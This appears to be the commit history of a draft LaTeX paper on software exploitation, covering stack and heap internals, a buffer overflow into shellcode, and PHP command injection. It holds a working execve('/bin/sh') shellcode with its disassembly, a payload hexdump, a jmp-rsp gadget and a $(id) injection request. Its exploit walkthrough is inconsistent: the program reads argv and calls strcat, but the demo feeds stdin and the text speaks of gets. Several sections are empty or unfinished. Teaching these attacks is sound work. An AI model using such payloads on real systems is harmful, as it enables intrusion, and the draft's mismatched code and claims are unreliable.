### 2023-06-20 paper.tex
Hic sunt draocnes.

\documentclass{article}
\usepackage{tikz}
\usetikzlibrary{matrix,shapes,arrows,positioning,decorations.pathreplacing}
\usepackage{comment}
\usepackage{marginnote}
\usepackage{pgf}
\usepackage{xstring}
\usepackage{listings}
\usepackage{xcolor}

\lstset{
    language=C,
    basicstyle=\ttfamily\small,
    keywordstyle=\color{blue}\ttfamily,
    stringstyle=\color{red}\ttfamily,
    commentstyle=\color{green}\ttfamily,
    morecomment=[l][\color{magenta}]{\#},
    breaklines=true
}

\begin{document}

\section{Abstract}%

Software exploitation continues to pose a significant threat to global
cybersecurity, with vulnerabilities in software systems offering fertile ground
for cyberattacks. The expanding complexity of contemporary software and the
incessantly evolving threat landscape only accentuates the magnitude of the
problem. This paper will discuss the concept of software exploitation,
elaborating on how attackers leverage vulnerability in software systems,
illustrating some common exploitation techniques including buffer overflows,
code injection, heap corruption, among others, while also exploring contemporary
exploit detection and prevention methodologies, from static and dynamic analysis
techniques to machine learngin and artificial intelligence-based approaches,
critically evaluating theirs strengths and weaknesses. Finally showcasing the
necessity for a proactive approach towards software security, outlining the
importance of secure coding practices and threat modeling in the early stages of
software development lifecycle. In conclusion this paper aims to offer an
in-depth review of the current landscape of exploitation, detection and
mitigation methodologies and techniques, emphasizing the criticality of these
techniques in fortifying software against threats.

\section{Motivation}%

Ever since my first encounter with the intricacies of reverse engineering and
binary exploitation, I've been completely engrossed in the enigmatic and
thrilling world of low-level computing. Each compiled binary, to me, is an
intricate puzzle waiting to be deciphered. Every line of assembly, every opcode,
and every bit is a brushstroke in an abstract painting that only a trained eye
can understand and appreciate. This appreciation for the art of reverse
engineering started when I participated in my first major CTF (Capture The Flag)
event called X-MAS CTF, which was organized by the Hecarii Tuica si Paunii team.
Having spent countless hours trying to reverse algorithms in binaries, writing
two emulators for custom made platforms in the span of a week and bending
innocuous binaries to do my bidding and execute arbitrary commands revealed to
me how awesome an expansive this field of software security is. This paper will
only cover a small area of this large field and I urge the readers to explore
all of the fields of CyberSec.

\section{Background}%

%   Explain how the Von-Newmann architecture works
%   Give some explaination about the stack and heap
%   Explain how virtualization works
\subsection{What is a Software Exploit?}%

In layman's terms, a Software Exploit is a series of steps taken by an attacker
(be it a human or computer) against another software system in order to trigger
some unintended functionality in that software system. Unintended functionality
could mean being able to execute arbitrary code on the machine running the
software system, getting access to private information/files, escalating their
priviledges to become an administrator or root user and even crashing the system.

\subsection{How does this happen?}%

\subsubsection{Not enough guardrails}%

From the perspective of software exploitation, the continuously increasing
complexity of modern software presents both a challenge and an opportunity. On
one hand, this complexity implies a vast landscape where vulnerabilities can
lurk unnoticed, potentially creating an opening for skilled attackers. System
programming languages, traditionally trusted with the task of creating such
software, provide programmers with great power but very few guardrails.
Languages like C and C++, for instance, allow direct memory manipulation without
inherent safeguards, leading to common vulnerabilities such as buffer overflows
or memory leaks.

\subsubsection{Improper input sanitization}%

In the majority of scenarios the fundamental mistake that the software
developers made is the improper validation of user controlled input. For example
let's take the venerable Buffer Overflow vulnerability, in which an attacker can
send more data that the application has space to process, resulting in Undefined
Behaviour. Depending on the scenario this undefined behaviour can be exploited
to redirect the execution flow of the program into code sent by the attacker (in
the case of a code injection attack on the stack), or could lead to corrupting
some important metadata somewhere else in the program (overwriting a password
variable to one you control, allowing you to login without knowing the real
password). These simple tehcniques have mostly been mitigated in modern systems
by employing passive mitigation techniques such as stack canaries and shadow
stacks (which will be discussed later).

\subsubsection{Dependencies}%

You could be the best programmer in the world, always writing code that stands
up to the highest standars of security but if you use a dependency that is
vulnerable to some exploit your program could still be at a high risk. In the
modern software landscape having a programming language without a package
manager is pretty much a show stopper. This has allowed developers to more
easily share and reuse code, undoubtably leading to increased productivity and
democratization of writing good and useful software, but on the other side the
ease of using someone else's code led us balloon our dependency graph like never
before. This poses a security risk not only from the exploitation standpoint but
also from a supply chain attack standpoint. Only one of the dependencies a
project uses needs to be compromised in order for the whole application to be
compromised.

This has happened multiple times in recent years and this article from LunaSec
showcases really well what happened, but also provides solutions on how to
mitigate these types of attacks in the future.
TODO:Make this a reference
https://www.lunasec.io/docs/blog/node-ipc-protestware/

\subsubsection{Anatomy of the stack on x64 platforms}%

The stack is a fundamental data structure in modern computing systems, and its
use in x64 systems is particularly interesting due to the specific features and
operations enabled by the x64 architecture. The stack is typically organized as
a contiguous region of memory, with two key pointers: the stack base pointer
(RBP in x64) and the stack pointer (RSP in x64). The stack grows `downward' in
memory, meaning that as new items are pushed onto the stack, the stack pointer
decreases in value. A typical function call on an x64 system involves pushing
the return address onto the stack, followed by the function's parameters
\footnote{In the most common calling convention the first few parameters are
passed in registers, not trough the stack}, and finally the local variables.
Upon function return, these elements are popped from the stack in reverse order,
ensuring correct program execution. However, the direct memory access afforded
by the stack also presents a potential vector for exploitation, with techniques
such as buffer overflow attacks targeting this fundamental structure.
Consequently, understanding the stack's functioning in x64 systems is crucial
both for building and for securing software systems.

Variables stored on the stack usually have their size known beforehand are not
really flexible to size requirements, unlike the heap, about which we will talk
in a later chapter.

\begin{figure}[ht]%
  \centering
  \begin{tikzpicture}[node distance=2cm]
    \tikzstyle{block} = [rectangle, draw, fill=blue!20, text width=5em, text
    centered, minimum height=2em, text width=3cm,
               text depth=0.25cm,
               text height=1em,
               align=center]
    \tikzstyle{line} = [draw, -latex']

    % Define matrix
    \matrix [matrix of nodes,
      nodes=block,
      column sep=0cm,
      row sep=0cm
    ] (stack) {
      {0xFF0060} & {...} \\
      {0xFF0058} & {Return address} \\
      {0xFF0050} & {Stack canary} \\
      {0xFF0048} & {Old RBP} \\
      {0xFF0040} & {foo} \\
      {0xFF0038} & {bar} \\
      {0xFF0030} & {...} \\
    };

    % Draw arrow with two right angles
    % \draw [red,thick,->] (stack-1-1.east) -- +(2cm,0) |- (stack-5-1.east) node[midway, right, black] {Pointer};
    \draw [red,thick,->] ([xshift=3cm]stack-6-2.east) --
    ([xshift=0cm]stack-6-2.east) node[midway, above, black] {Value of rsp};

    \draw [red,thick,->] ([xshift=3cm]stack-4-2.east) --
    ([xshift=0cm]stack-4-2.east) node[midway, above, black] {Value of rbp};

  % \draw [decorate,decoration={brace,amplitude=10pt}]
  %     (stack-1-2.north east) -- (stack-3-2.south east)
  %     node[midway,xshift=1.5cm,] {Group 1};

  \end{tikzpicture}
  \caption{\label{fig:label} Stack frame of a function with local variables
    `foo' and `bar'}%
  \label{fig:stackframe}
\end{figure}

An example state of the stack during the call~\footnote{This example is used for
simplicity. In real world scenarios the variables would have been constant
propagated and the function would have directly returned the result of the
computation} to the function `example`~\ref{code:example_func} is shown in~\ref{fig:stackframe}.

\begin{lstlisting}
  int example()
  {
    int foo = 3;
    int bar = 7;

    return foo + bar;
  }
\end{lstlisting}%
\label{code:example_func}

We can see that the stack frame contains some interesting `variables' that we
haven't defined ourselves:
\begin{itemize}
  \item \textbf{RBP} -~Base pointer. This has been historically used to keep
        track of the start (or base) of our function's stack frame. Functions are usually not allowed to modify values above this address (even though there are some exceptions like copy ellision TODO add copy elision ref).
  \item \textbf{Old RBP} -~Base pointer of the caller.
  \item \textbf{Stack canary} -~This will be explained in the mitigations section TODO add mitigations ref, we will ignore it for this example.
  \item \textbf{Return address} -~For our purposes this is the most important variable. This value is used by the callee to return (hence return address) the execution flow back to the caller when the function finished executing. Another important fact is that this value is stored in the same area as our variables.
\end{itemize}

Now that we have an understanding of how a stack frame looks we can move on to
how stack frames are linked together. The example below shows the state of the
stack while executing the following nested function call chain~\footnote{Here foo is assumed to be a function that does not return} (the
`calls' operation is denoted by $\Rightarrow$):

\begin{equation}
  foo \Rightarrow bar \Rightarrow baz \Rightarrow qux
\end{equation}

This structure is basically a singly linked list of stack frames, with \emph{RBP} as their forward pointer. The function the processor is currently executing is at the head of the list, and the first function called by the program is situated at the tail. Because user variables are mixed with control structures, we can imagine what the outcome would be if we managed to corrupt the \emph{forward} pointer in this linked list.

\begin{figure}[ht]%
  \centering
  \begin{tikzpicture}[node distance=2cm]
    \tikzstyle{block} = [rectangle, draw, fill=blue!20, text width=12em, text
    centered, minimum height=2em,
               text depth=0.25cm,
               text height=1em,
               align=center]
    \tikzstyle{line} = [draw, -latex']

    % Define matrix
    \matrix [matrix of nodes,
      nodes=block,
      column sep=0cm,
      row sep=0cm
    ] (stack) {
       |[fill=gray!20   ]| {Start of stack}\\
       |[fill=red!20    ]| {vars} \\
       |[fill=green!20  ]| {return address} \\
       |[fill=green!20  ]| {old rbp} \\
       |[fill=green!20  ]| {vars} \\
       |[fill=blue!20   ]| {return address} \\
       |[fill=blue!20   ]| {old rbp} \\
       |[fill=blue!20   ]| {vars} \\
       |[fill=orange!20 ]| {return address} \\
       |[fill=orange!20 ]| {old rbp} \\
       |[fill=orange!20 ]| {vars} \\
       |[fill=gray!20   ]| {End of stack}\\
    };

    Draw arrow with two right angles
    \draw [green,thick,->] (stack-4-1.east) -- +(2cm,0) |- (stack-2-1.north east) node[midway, right, black] {};

    \draw [blue,thick,->] (stack-7-1.east) -- +(2cm,0) |- (stack-5-1.north east) node[midway, right, black] {};

    \draw [orange,thick,->] (stack-10-1.east) -- +(2cm,0) |- (stack-8-1.north east) node[midway, right, black] {};

    \draw [decorate,decoration={brace,amplitude=10pt,mirror}]
    (stack-2-1.north west) -- (stack-2-1.south west)
    node[midway,xshift=-1.5cm,] { \emph{foo}'s frame};

    \draw [decorate,decoration={brace,amplitude=10pt,mirror}]
    (stack-3-1.north west) -- (stack-5-1.south west)
    node[midway,xshift=-1.5cm,] { \emph{bar}'s frame};

    \draw [decorate,decoration={brace,amplitude=10pt,mirror}]
    (stack-6-1.north west) -- (stack-8-1.south west)
    node[midway,xshift=-1.5cm,] { \emph{baz}'s frame};

    \draw [decorate,decoration={brace,amplitude=10pt,mirror}]
    (stack-9-1.north west) -- (stack-11-1.south west)
    node[midway,xshift=-1.5cm,] { \emph{qux}'s frame};

  \end{tikzpicture}
  \caption{\label{fig:label} Stack state when executing 3 nested calls}%
  \label{fig:stackframe}
\end{figure}

\subsubsection{Anatomy of the Heap}
Here we will take a small departure
from the world of semi-standardized calling conventions and venture in the
implementation defined lands of \emph{malloc} and \emph{free}. Ever since it's
inception, this api has been the bane of every C programmer's existence when
they started out programming. We will now examine in depth this API.\@

\subsubsection{malloc}
TODO add ref to standards
The malloc function is a part of the C Standard Library, as specified by both
the ANSI C and ISO C standards. It is used for dynamic memory allocation in C
programs, allowing the programmer to request a specific amount of memory space
at runtime. The malloc function, defined in the stdlib.h header file, takes a
single argument: the number of bytes to be allocated, and it returns a pointer
to the first byte of the allocated space.

The behavior of malloc is strictly defined by the C standard. Upon successful
execution, malloc provides a block of memory that is suitably aligned for any
kind of variable. The allocated memory is uninitialized, meaning it contains
indeterminate values. If the function fails to allocate the requested memory,
perhaps due to insufficient memory space, it returns a NULL pointer.
Importantly, the standard guarantees that malloc will not modify the content of
the allocated memory, which differentiates it from similar functions like
calloc, which sets the allocated memory to zero. The pointer returned by malloc
is always a unique address that is not being used elsewhere in the program,
until it is freed by the \emph{free} function.

\subsubsection{free}
Thre \emph{free} function pretty much does the inverse of what malloc does. It
marks the memory allocation starting at the address given as a parameter as free
for use by the allocator. The algorithm behind the dynamic memory allocation API
is left to be implementation defined. We will dig deeper into the
allocator used by LibC on the GNU/Linux operating system.

\subsection{Allocating memory in Linux}
The allocator used by the C standard library on linux is a variation of
\emph{ptmalloc}. There are two main ways to allocate memory using this
allocator. The allocator automatically chooses which technique to use based on
the size of the requested allocation\footnote{We will be referring to
allocations with a size $<$ {M\_MMAP\_THRESHOLD} as \emph{small} and to
allocations larger than that as \emph{big}}\footnote{{M\_MMAP\_THRESHOLD} is set
to 127k bytes by default}:
\begin{itemize}
  \item \emph{small}~-~served by the allocation algorithm
  \item \emph{large}~-~served by a call to \emph{mmap}
\end{itemize}

Large allocations bypass the allocation algorithm entirely (and will not be the
focus for our exploitation scenarios), unlike small allocations which pass
trough a pretty complex set of steps before the memory is actually given to us.
We will now discuss this algorithm in detail, pointing out areas of interest
that will help us develop exploits and mitigations later.

\subsection{GLibc allocation algorithm}
\subsubsection{Background}
\begin{itemize}
  \item \emph{Arena}~-~An arena is a structure accessible by one or multiple
threads, holding references to one or several heaps. It also includes linked
lists of unallocated `chunks' within these heaps. Threads associated with a
specific arena draw their memory from the free lists of that arena.
  \item \emph{Heap}~-~A heap is a sequential memory region divided into smaller
units, known as chunks, for allocation purposes. Each heap is uniquely
associated with a single arena.
  \item \emph{Chunk}~-~A chunk represents a small, allocatable memory section.
This memory can be allocated (controlled by the application), freed (controlled
by glibc), or merged with nearby chunks to create larger sections. Importantly,
a chunk essentially serves as a shell encompassing the block of memory delivered
to the application. Every chunk is part of one heap and linked to a single
arena.
  \item \emph{Memory}~-~Memory refers to a segment of the application's address
space, generally supported by RAM or swap
\end{itemize}

\subsubsection{Allocation}
The operation of the \texttt{malloc} function can be succinctly described as
follows:

\begin{enumerate}
\item In case a chunk with an exact match is available in the \texttt{tcache},
it is returned. Note that no attempts are made to utilize an existing chunk from
a bin of a larger size.

\item For sufficiently large requests, memory is directly acquired from the
operating system using the \texttt{mmap()} function. It is noteworthy that the
threshold for triggering \texttt{mmap()} is dynamic, subject to the
\texttt{M\_MMAP\_THRESHOLD} parameter (refer to the \texttt{mallopt()}
documentation), and there may exist a constraint on the number of mappings
permissible concurrently.

\item If an adequate chunk exists in the appropriate \texttt{fastbin}, it is
used. If additional chunks are available, the \texttt{tcache} is prefilled.

\item In the scenario where the appropriate \texttt{smallbin} contains a chunk,
it is used, with the possibility of \texttt{tcache} being prefilled.

\item For "large" requests, the function executes a routine to transfer all
elements in the \texttt{fastbins} to the unsorted bin while coalescing them.

\item The function then starts retrieving chunks from the unsorted list,
subsequently placing them into small/large bins, again coalescing in the
process. The function uses a chunk if it is of the required size. This is the
only point in the code where chunks are inserted into small/large bins.

\item In the case of "large" requests, the function searches the appropriate
large bin and subsequently larger bins until a sufficiently large chunk is
found.

\item If chunks remain in the \texttt{fastbins} (which could occur for "small"
requests), these are consolidated, and the previous two steps are repeated.

\item Part of the "top" chunk is split off, with a possibility of enlarging the
"top" chunk prior to this.

\item For requests requiring over-aligned \texttt{malloc}, such as
\texttt{valloc}, \texttt{pvalloc}, or \texttt{memalign}, an overly-large chunk
is located using the above \texttt{malloc} algorithm. This chunk is then divided
into two or more chunks such that the majority of the chunk is suitably aligned
and returned to the caller. The excess portions before and after this chunk are
returned to the unsorted list for future usage.
\end{enumerate}

\subsubsection{Free} Generally, the act of "freeing" memory does not entail
returning it to the operating system for alternative applications' use. A
\texttt{free()} call designates a memory chunk as "available for reuse" by the
application; from the perspective of the operating system, the memory still
"belongs" to the application. However, should the top chunk in a heap -- the
section adjacent to unmapped memory -- grow significantly, some of the memory
could potentially be unmapped and returned to the operating system.

To summarize, the \texttt{free()} function operates as follows:

\begin{enumerate}
\item If space is available in the \texttt{tcache}, the chunk is stored there,
and the function returns.

\item If the chunk's size is sufficiently small, it is placed in the
corresponding \texttt{fastbin}.

\item If the chunk was allocated using \texttt{mmap()}, it is deallocated with
\texttt{munmap()}.

\item The function checks whether the chunk is adjacent to another free chunk
and coalesces the two if possible.

\item The chunk is positioned in the unsorted list, except if it has become the
"top" chunk.

\item For sufficiently large chunks, any \texttt{fastbins} are coalesced, and
the function checks if the top chunk is large enough to return some memory to
the system. It's worth noting that this step may be deferred due to performance
considerations and could occur during a \texttt{malloc} or another call.
\end{enumerate}

\subsubsection{Detecting heap corruption}
The \texttt{malloc} subsystem implements a series of measures aimed at detecting
heap corruption throughout its codebase. Certain checks can consistently
identify errors (for instance, passing an insufficiently aligned pointer to
\texttt{free()}). However, the majority of these checks are heuristic and may
not identify contrived, false chunks that mimic legitimate ones (for instance,
checks for forward/backward linking of chunks). Consequently, heap corruption
may persist undetected for an extended duration, or might not be reported
altogether.

Common forms of corruption are managed via calls to \texttt{malloc\_printerr};
these checks are invariably included in the code. Additional checks utilize
\texttt{assert} and can thus be disabled by building \texttt{glibc} with the
\texttt{-DNDEBUG} flag. In the current \texttt{glibc} version, both types of
checks terminate the process via a call to \texttt{\_\_libc\_message}, which
ultimately invokes \texttt{abort}. Note that although very old versions of
\texttt{glibc} offered the ability to continue execution in the presence of heap
corruption, this feature has since been discontinued.

In the following chapter we will be exploring ways to the bypass corruption checks
in order to achieve arbitrary code execution.

% ASDASD pe ast il punem la case studies
% The pervasive nature and potential harm of software exploits have catalyzed the
% establishment of critical global standards for vulnerability tracking and
% response. One such prominent standard is the Common Vulnerabilities and
% Exposures (CVE) system. Launched in 1999 by the MITRE Corporation, a
% not-for-profit organization, the CVE provides a standardized method for
% identifying and cataloging known vulnerabilities. Each identified vulnerability
% is assigned a unique CVE Identifier (CVE-ID), allowing cybersecurity experts
% worldwide to share information using a common language. By providing a universal
% reference, the CVE system streamlines the process of discussing, researching,
% and resolving known exploits, and assists in the broader efforts of
% vulnerability management and mitigation. The creation and widespread adoption of
% the CVE standard underscore the recognition within the global tech community of
% the critical need for coordinated, standardized responses to the persistent
% threat of software exploitation.

% In contrast, this complexity also inspires
% and necessitates the evolution of more secure programming practices and
% languages. One such notable example is Rust, a systems programming language that
% promises memory safety without sacrificing performance. Rust's borrowing
% mechanism provides a robust guardrail, enforcing access controls to memory at
% compile-time, thus inherently mitigating a class of exploits. However, not all
% software can or will be rewritten in Rust or similar languages, and the majority
% of systems today still run on code written in languages with fewer safety
% features. As such, the balance between software complexity, performance, and
% security continues to be a critical and fascinating aspect of the software
% exploitation landscape.

\section{Software Exploitation Techniques}%
Software exploitation has been a prevalent issue almost as early as the
inception of software itself, underpinning the need for constant vigilance and
innovation in the field of software security. Early instances of software
exploitation can be traced back to the late 1980s with the advent of the Morris
Worm. Considered as one of the first computer worms distributed via the
Internet, the Morris Worm infected approximately 6,000 computers, causing
significant slowdowns or even rendering them unusable
\cite{spafford1989internet}. Since then, various forms of software
vulnerabilities have been exploited, including buffer overflows, injection
attacks, and privilege escalation, leading to massive data breaches, disruptions
in services, and significant financial losses \cite{owasp2017}. The history of
software exploitation elucidates the perpetual arms race between attackers
seeking to exploit vulnerabilities and defenders striving to secure systems, a
dynamic that continues to define the software security landscape today.

\subsection{Early stage}
\begin{comment}
  shellcoding
  reference smashing the stack for fun and profit
\end{comment}
One of the earliest vulnerability that was exploited was the venerable bufffer
overflow. A Buffer overflow represents a crucial class of software
vulnerabilities that can serve as a launching pad for a myriad of complex
exploits, one of which includes shellcode injection. This vulnerability arises
when more data is written to a buffer than it can hold, thereby allowing an
attacker to overwrite adjacent memory locations \cite{seacord2013}. If exploited
judiciously, this can lead to the alteration of program's control flow, enabling
an attacker to execute arbitrary code. One manifestation of this is shellcoding,
where an attacker injects a sequence of bytes, often encoding command-line shell
instructions, into the memory and manipulates the program's execution flow to
execute this code \cite{one1996smashing}. This capability to execute arbitrary
code gives the attacker full control over the compromised system, thereby
illustrating the severity and implications of buffer overflow vulnerabilities.

\begin{lstlisting}[caption={Program vulnerable to a buffer  overflow}
      ,label={lst:label}
      ,language=Java]

\end{lstlisting}

\subsection{Evolution}
\begin{comment}
  ret2libc
  Mention the lack of mitigation
  Rise of heap based exploits due to browsers and JS
  Research some linux&windows kernel exploits
\end{comment}
\subsection{State of the art}
\begin{comment}
  Rise of the hypervizor exploits (showcase some virtualbox exploits, maybe
  vmware hyperv) RCE Exploits mostly slowing down Common techniques no longer
  being effective (check offbyonesec talk about windows kernel exploitation, talk
  about)
\end{comment}

\section{Detection techniques}%

\section{Mitigation Techniques}%

\section{Case studies}%

\section{Future trends}%

\section{Conclusion}%

\section{References}%

\end{document}

### 2023-06-20 paper.tex
haha

@@
 
-\begin{lstlisting}[caption={Program vulnerable to a buffer  overflow}
-      ,label={lst:label}
-      ,language=Java]
+Below \ref{lst:bof} is an example of a vulnerable program.
 
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Buffer overflow shellcoding example}
+      ,label={lst:bof}
+      ,language=C]
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/* This function is a gadget typically
+ * found through Return Oriented Programming (ROP)
+ * in a larger binary, and it's crucial
+ * for changing control flow.
+ * It serves to demonstrate the general
+ * concept in this simplified context.
+ *
+ * In a real-life scenario,
+ * it would be necessary to find this gadget
+ * or pivot the stack in a different manner.
+ */
+extern void __attribute__((naked)) helper_gadget() {
+        __asm(".intel_syntax noprefix\n"
+              "jmp rsp\n"
+              ".att_syntax\n");
+}
+
+/* Example of a vulnerable function in which
+ * the size of the concatenated strings is not
+ * checked to be less than the size of the
+ * buffer in which they are concatenated.
+ *
+ * This would most likely never cause issues
+ * because names are almost never this long, but
+ * it is easy for an attacker to exploit this.
+ */
+void say_hi(char* name) {
+        char local_buffer[0x100];
+
+        strcat(local_buffer, "Hi ");
+        strcat(local_buffer, name);
+        strcat(local_buffer, "!");
+
+        puts(local_buffer);
+
+        return;
+}
+
+int main(int argc, char** argv) {
+        if (argc != 2) {
+                fprintf(stderr, "usage: say_hi <name>\n");
+                return 1;
+        }
+
+        say_hi(argv[1]);
+
+        return 0;
+}
 \end{lstlisting}
+\end{minipage}
+
+Running the program with my name gives an expected output:
+\begin{lstlisting}[caption={Non-malicious input}
+      ,label={lst:bof_valid}
+      ,language=bash]
+$ ./say_hi Liviu
+Hi Liviu!
+\end{lstlisting}
+
+But running the program with the following malicious crafted input we get
+a vastly different result:
+
+\begin{lstlisting}[caption={Malicious input}
+      ,label={lst:bof_malicious}
+      ,language=bash]
+# The `cat` command is used just to keep
+# the stdin of the `say_hi` program open
+$ cat shellcode_malicious_input.bin - | ./say_hi
+aaaa
+Hi !
+ls
+Makefile  say_hi  shellcode_malicious_input.bin
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Hexdump of malicious input}
+      ,label={lst:bof_malicous_hex}
+      ,language=bash]
+0000000 0000 0000 0000 0000 0000 0000 0000 0000
+*
+0000100 0000 0000 0000 0000 115a 0040 0000 0000
+0000110 9090 9090 9090 9090 9090 9090 9090 9090
+*
+0000310 8148 80ec 0000 6a00 4868 2fb8 6962 2f6e
+0000320 2f2f 5073 8948 68e7 6972 0101 3481 0124
+0000330 0101 3101 56f6 086a 485e e601 4856 e689
+0000340 d231 3b6a 0f58 0005
+0000347
+\end{lstlisting}
+Our simple program seems to be behaving like a system shell. We will now analyse
+what happened during the execution of our program. Here~\ref{lst:bof_malicous_hex}
+is a hexdump of the input. Let's break it down:
+
+\begin{figure}[ht]%
+  \centering
+  \begin{tikzpicture}[node distance=2cm]
+    \tikzstyle{block} = [rectangle, draw, fill=blue!20, text width=5em, text
+    centered, minimum height=2em, text width=5cm,
+               text depth=0.25cm,
+               text height=1em,
+               align=center]
+    \tikzstyle{line} = [draw, -latex']
+
+    % Define matrix
+    \matrix [matrix of nodes,
+      nodes=block,
+      column sep=0cm,
+      row sep=0cm
+    ] (stack) {
+      {...} \\
+      |[fill=red!20, minimum height=5em]|
+      {return address (to \emph{libc\_start\_call\_main})} \\
+      {\emph{rbp} of \emph{libc\_start\_call\_main}} \\
+      |[fill=red!20]|
+      {return address (to \emph{main})} \\
+      {\emph{RBP} of \emph{main}} \\
+      |[minimum height=12em]|
+      {\emph{local\_buffer}} \\
+    };
+
+    % Draw arrow with two right angles
+    % \draw [red,thick,->] (stack-1-1.east) -- +(2cm,0) |- (stack-5-1.east) node[midway, right, black] {Pointer};
+    \draw [red,thick,->] ([xshift=3cm]stack-6-1.south east) --
+    ([xshift=0cm]stack-6-1.south east) node[midway, above, black] {rsp};
+
+    \draw [red,thick,->] ([xshift=3cm]stack-4-1.east) --
+    ([xshift=0cm]stack-4-1.east) node[midway, above, black] {rbp};
+
+    \draw [decorate,decoration={brace,amplitude=10pt,mirror}]
+    (stack-6-1.north west) -- (stack-6-1.south west)
+    node[midway,xshift=-1.5cm,] {0x100 bytes};
+
+    \draw [decorate,decoration={brace,amplitude=10pt,mirror}]
+    (stack-5-1.north west) -- (stack-5-1.south west)
+    node[midway,xshift=-1.5cm,] {0x8 bytes};
+
+    \draw [decorate,decoration={brace,amplitude=10pt,mirror}]
+    (stack-4-1.north west) -- (stack-4-1.south west)
+    node[midway,xshift=-1.5cm,] {0x8 bytes};
+
+  % \draw [decorate,decoration={brace,amplitude=10pt}]
+  %     (stack-1-2.north east) -- (stack-3-2.south east)
+  %     node[midway,xshift=1.5cm,] {Group 1};
+
+  \end{tikzpicture}
+  \caption{\label{fig:label} State of the stack before executing \emph{gets} in the function \emph{say\_hi}}%
+  \label{fig:stackframe}
+\end{figure}
 

### 2023-06-20 paper.tex
loleo

@@
 \lstset{
-    language=C,
     basicstyle=\ttfamily\small,
@@
     stringstyle=\color{red}\ttfamily,
-    commentstyle=\color{green}\ttfamily,
+    commentstyle=\color{gray}\ttfamily,
     morecomment=[l][\color{magenta}]{\#},
@@
 \subsection{Early stage}
+\subsubsection{Shellcoding}
 \begin{comment}
@@
 is a hexdump of the input. Let's break it down:
+\begin{enumerate}
+  \item The first 0x100 bytes of the payload are just null bytes\footnote{We are
+  allowed to do this because \emph{gets} does not stop reading the string when it
+  encounters a \emph{NULL} (0) byte, even though strings in C are almost always
+  NULL terminated.~\emph{scanf} will only return when it encounters an error or
+  reads a line ending}. We do this in order to fill up the buffer that the
+  application uses. These values could realistically be anything (besides line
+  endings).
+  \item As shown in\ref{veziacistackuala} we now need to overflow the
+  \emph{base pointer}. In this exploitation scenario this can also be any value,
+  but it can allow us to pivot the stack into some memory address we know in some cases.
+  \item Now we overwrite the \emph{return address} to point to the address of the \emph{jump rsp} instruction.
+  \item After the return address we place a \emph{nop sled}. The purpose of the nop
+  sled is to allow us some leeway\footnote{When jumping into shellcode written to the stack the addresses the stack register and instruction pointer point to are close together.
+Stack manipulations (such as \emph{push}es and \emph{pop}s) can overwrite the shellcode, causing it to misbehave or making the processor execute illegal instructions.} when crafting the actual malicious payload.
+  \item Finally we place the instructions we want to execute. The payload exemplified\ref{vezipayload} here uses the \emph{execve} syscall to replace the current running
+  process with the \emph{sh} shell process.
+\end{enumerate}
+
+This traditional exploitation technique of buffer overflow into shellcode has
+been effectively mitigated by a plethora of defensive mechanisms that we will
+discuss in subsequent chapters, such as Address Space Layout Randomization
+(ASLR), Data Execution Prevention (DEP), Stack Canaries, and Control-Flow
+Integrity (CFI). Despite these advancements, the described exploitation
+scenarios retain relevance in contexts where these protection measures are
+absent or cannot be implemented. For example, systems lacking a Memory
+Management Unit (MMU), many embedded systems, and certain router configurations
+may not have these defenses, leaving them susceptible to such attacks. Thus,
+understanding these exploits remains critical in a comprehensive approach to
+system security.
 
@@
 
+\begin{lstlisting}[caption={Shellcode disassembly}
+      ,label={lst:bof}
+      ,language={[x86masm]Assembler}]
+    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
+    /* push b'/bin///sh\x00' */
+    push 0x68
+    mov rax, 0x732f2f2f6e69622f
+    push rax
+    mov rdi, rsp
+    /* push argument array ['sh\x00'] */
+    /* push b'sh\x00' */
+    push 0x1010101 ^ 0x6873
+    xor dword ptr [rsp], 0x1010101
+    xor esi, esi /* 0 */
+    push rsi /* null terminate */
+    push 8
+    pop rsi
+    add rsi, rsp
+    push rsi /* 'sh\x00' */
+    mov rsi, rsp
+    xor edx, edx /* 0 */
+    /* call execve() */
+    push SYS_execve /* 0x3b */
+    pop rax
+    syscall
+\end{lstlisting}
+
+\subsubsection{Command injection}
+Command injection vulnerabilities represent a pervasive class of security issues
+that impact both web and system programming environments. These vulnerabilities
+occur when an application passes unsafe user-supplied data (forms, cookies, HTTP
+headers, etc.) to a system shell, allowing the attacker to execute arbitrary
+commands on the host operating system. In the context of web applications, these
+flaws are primarily found in scripts that fail to properly sanitize user input,
+making them susceptible to cross-site scripting (XSS) and SQL injection attacks.
+However, command injection vulnerabilities are not confined to web programming;
+they are equally prevalent in systems programming. Poorly designed system
+applications and scripts that accept untrusted input for command execution can
+expose the system to similar attacks. This vulnerability, thus, underlines the
+importance of careful data handling and proper input validation, irrespective of
+the programming environment.
+
+We will be walking through the following\ref{veziphpbapula} vulnerable PHP app.
+The application lacks proper input validation and allows an attacker to execute
+arbitrary commands. The use of the \emph{system} function will cause the following
+process to execute \texttt{sh -c ``echo Hello <username>''}. Our\ref{poggeroni}
+malicious request sets the \emph{username} parameter to \verb|$(id)|. Because
+the original command executes in a shell environment, the shell will interpret
+this string by forking itself and executing the string in between the braces and
+replacing the original string with the result of the command. We can imagine that
+we can cause havoc on the vulnerable machine by being able to execute any command
+we want.
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Command Injection example}
+      ,label={lst:bof}
+      ,language=PHP]
+<?php
+    $username = $_GET['username'];
+    system("echo Hello " . $username);
+?>
+\end{lstlisting}
+\end{minipage}
+
+\begin{lstlisting}[caption={Command Injection example}
+      ,label={lst:bof}
+      ,language=bash]
+$ docker run -d -p 8080:80 command_injection_php
+d58498277e1194cc46dac4009f8fca1c84ce02bea21008075ad53f77bd63202f
+$ curl http://127.0.0.1:8080/hello\?username\=$\(id\)
+Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)
+\end{lstlisting}
+
+Command injection vulnerabilities can drastically undermine security measures.
+They enable attackers to bypass reverse proxies, offering unauthorized access to protected internal services.
+Moreover, such vulnerabilities can assist in creating botnets by allowing threat actors to inject commands to download and install malicious software, leading to potential large-scale cyber threats such as Distributed Denial of Service (DDoS) attacks.
+
+The situation is similar in the systems programming space. The example for how 
+a vulnerable program might look is left as an exercise to the reader.
 \subsection{Evolution}

### 2023-06-22 paper.tex
meme2

@@
 \usepackage{tikz}
-\usetikzlibrary{matrix,shapes,arrows,positioning,decorations.pathreplacing}
+\usetikzlibrary{matrix,shapes,arrows,positioning,decorations.pathreplacing,arrows.meta}
 \usepackage{comment}
